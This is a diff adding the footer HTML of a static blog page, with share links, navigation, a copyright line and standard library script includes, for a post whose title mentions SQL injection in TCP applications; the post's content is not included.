+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&t=TCP应用SQL注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    z1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
